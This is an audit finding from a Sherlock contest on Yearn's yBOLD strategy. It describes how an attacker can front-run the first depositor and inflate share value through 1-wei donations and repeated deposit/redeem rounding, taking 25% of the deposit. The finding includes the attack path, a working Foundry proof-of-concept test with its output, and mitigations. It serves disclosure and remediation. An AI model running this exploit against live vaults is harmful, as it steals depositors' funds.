---
tags:
  - lang/solidity
  - lang/vyper
  - sector/staking
  - sector/vault
  - sector/yield-aggregator
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - trigger/first-deposit
protocol: "[[Yearn]]"
auditors:
  - "[[Obsidian]]"
report: "https://github.com/sherlock-audit/2025-05-yearn-ybold-judging"
genome:
  - "[[arithmetic/rounding]]"
  - "[[first-deposit]]"
  - "[[direct-drain]]"
  - "[[fot-slippage]]"
  - "[[frontrun-exposure]]"
  - "[[integer-bounds]]"
  - "[[vote-delegation-loop]]"
---
# H-1: A malicious attacker can steal 25% of the funds of the first depositor in a strategy

- id: 57686
- impact: HIGH
- protocol: [[Yearn]] yBOLD
- reporter: Obsidian (Sherlock)
- source: N/A

## Summary


The report describes a bug in a code that allows a malicious attacker to steal 25% of the funds of the first person who deposits money into a certain strategy. This is caused by a flaw in the code that allows the attacker to inflate the value of shares without making an initial deposit. This can be done by transferring a small amount of money and reporting fake profits. The attack can be carried out quickly and easily with the help of an administrator, but it is also possible without their involvement. The impact of this bug is significant, as it can result in a substantial loss for the depositor. The report also includes a proof of concept and suggests possible solutions, such as enforcing a minimum deposit or using slippage protection.

## Details

Source: https://github.com/sherlock-audit/2025-05-yearn-ybold-judging/issues/154 

## Found by 
Obsidian

### Summary

Inflatability of the `TokenizedStrategy` share value, combined with the lack of an initial deposit via the `StrategyFactory`, allows a malicious attacker to steal 25% of the first depositor's funds.

### Root Cause

The [Strategy](https://github.com/sherlock-audit/2025-05-yearn-ybold/blob/88a3b89c05fd6e59ec130c79659195cd05d872af/yv3-liquityv2-sp-strategy/src/Strategy.sol#L13) contract inherits it's vault logic from Yearn's `BaseStrategy`  which delegates to the logic of the `TokenizedStrategy` contract.

The issue is that the `Strategy`  does not perform an initial deposit into the vault during construction, allowing an attacker to inflate the share value to steal from a depositor. 

### Internal Pre-conditions

N/A

### External Pre-conditions

N/A

### Attack Path

The following attack uses a malicious admin to make the attack easier and quicker:
- set profit max unlock time to zero (helps make the attack's setup instant)
- immediately report the 1 wei profit (helps immediately achieve the state of totalAssets=2, totalShares=1)

The README states that admins should not be able to steal depositor funds:
> if any role is able to set a value in a way that could result in the theft of depositor funds, this would be considered a valid finding. No role should be capable of stealing from depositors or permanently blocking withdrawals.

Nonetheless, the attack is still possible without the admin involvement, it would just require waiting for the profit max unlock time to complete, and for a keeper to report the 1 wei of profit

Attack path:

1. New strategy is created (via the `StrategyFactory` for example)
2.  Malicious attacker observes the first depositor's transaction in the mempool (assume a $100k deposit)
3. Malicious attacker performs the following steps to inflate the share value:
- deposit 1 wei of BOLD into the strategy
- transfer 1 wei of BOLD into the strategy contract
- `report()` the gain, to achieve the state of totalAssets=2, totalShares=1; which is needed for inflation to begin
- repeatedly deposit and redeem shares, donating to the vault due to the rounding against the attacker.
- the share value is inflated up to a state where 1 wei of shares is equivalent to $50k + 1 wei assets
- due to the share value being inflated at an exponential rate, the above steps all occur in a single tx
4. depositor's transaction goes through, the shares owed to them is equal to 1.9999999, which rounds down to 1
5. Now the state is `totalAssets = $150k + 1 wei, totalShares  = 2`
6. The attacker can withdraw their 1 share for half of the total assets, receiving $75k. The attacker profits $25k, while the depositor loses $25k, which is 25% of the depositor's funds






### Impact

A malicious attacker can steal 25% of the first depositor's deposited funds, forcing the depositor to suffer a substantial loss. 

### PoC

Add the following PoC to `Operation.t.sol`

Console output:
```solidity
Logs:
  totalAssets 2e0
  totalSupply 1e0
  totalAssets 5.0000000000000000000001e22
  totalSupply 1e0
  attacker profit 2.4999999999999999999999e22
  user loss 2.4999999999999999999999e22
  user's deposit 1e23
```

Test:

```solidity
function test_steal_from_first_deposit() public {
    address attacker = makeAddr("attacker");
    
    deal(address(asset), attacker, 1e23);
    deal(address(asset), user, 1e23);

    uint attackerBalanceBefore = asset.balanceOf(attacker);
    uint userBalanceBefore = asset.balanceOf(user);


    ////////// TX 1 //////////
    
    vm.startPrank(management);
    strategy.setProfitMaxUnlockTime(0);

    vm.startPrank(attacker);
    asset.approve(address(strategy), type(uint256).max);

    // deposit 1 wei of assets
    strategy.deposit(1, attacker);

    // donate and report a profit of 1 wei (to achieve initial state of 2 assets, 1 share)
    asset.transfer(address(strategy), 1);

    vm.startPrank(management);
    strategy.report();

    console2.log("totalAssets %e", strategy.totalAssets());
    console2.log("totalSupply %e", strategy.totalSupply());

    // innocent user intends to deposit 1e23 BOLD (~$100k)
    uint userDeposit = 1e23;

    vm.startPrank(attacker);
    // in a single tx, attacker frontruns user by exponentially inflating share value to $50k + 1 
    while (true) {
        strategy.deposit(strategy.totalAssets() * 2 - 1, attacker);

        if (strategy.totalAssets() > 1 + userDeposit / 2) {

            strategy.withdraw(strategy.totalAssets() - (1 + userDeposit / 2), attacker, attacker, 10_000);

            console2.log("totalAssets %e", strategy.totalAssets());
            console2.log("totalSupply %e", strategy.totalSupply());

            break;
        }
        strategy.redeem(1, attacker, attacker, 10_000);
    }

    ////////// TX 2 //////////

    // user deposits 1e23 BOLD (~$100k)
    // they are meant to receive 1.99999999 shares, this is rounded down to 1 share
    vm.startPrank(user);
    asset.approve(address(strategy), userDeposit);
    strategy.deposit(userDeposit, user);
   
    // attacker withdraws funds, stealing 25% of depositor's funds
    vm.startPrank(attacker);
    uint assets = strategy.redeem(strategy.balanceOf(attacker), attacker, attacker, 10_000);
    
    vm.startPrank(user);
    uint userAssets = strategy.redeem(strategy.maxRedeem(user), user, user, 10_000);

    uint attackerBalanceAfter = asset.balanceOf(attacker);
    uint userBalanceAfter = asset.balanceOf(user);

    console2.log("attacker profit %e", (attackerBalanceAfter - attackerBalanceBefore));
    console2.log("user loss %e", (userBalanceBefore - userBalanceAfter));
    console2.log("user's deposit %e", userDeposit);
}
```

### Mitigation

One solution would be to enforce a small initial deposit (>1000 wei) upon deployment of a new strategy in the `StrategyFactory`, and burning the minted shares. This prevents the shares from being inflatable.

Another solution is to use slippage protection in the deposit function to set a minimum number of shares received.
